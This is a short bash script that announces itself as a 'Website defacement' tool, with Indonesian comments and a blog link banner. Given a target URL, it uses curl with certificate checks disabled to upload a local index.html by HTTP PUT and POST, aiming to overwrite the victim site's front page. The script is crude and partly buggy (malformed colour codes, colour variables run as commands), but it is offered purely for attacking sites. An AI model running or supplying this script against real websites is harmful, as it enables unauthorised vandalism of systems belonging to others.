#!/bin/bash

#definisikan array.
{
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
}


echo $red """
------------------------------------------------
"""
$okegreen
echo "   https://cruznos.blogspot.com"
echo
$white
if [ -z "$1" ]; then
        echo $red"Website defacement. "
        echo $white"Use: $0 <URL>"
        exit 0
fi

echo
curl -k -T index.html $1
curl -k -X POST -F index.html $1
